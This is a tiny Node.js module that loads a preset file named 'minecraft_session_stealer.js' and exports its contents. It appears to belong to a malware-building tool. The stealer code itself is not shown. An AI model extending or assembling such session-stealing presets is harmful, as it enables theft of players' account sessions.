const fs = require('fs');

module.exports = {
    minecraft_session_stealer: fs.readFileSync(__dirname + '/./presets/minecraft_session_stealer.js', 'utf8'),
};
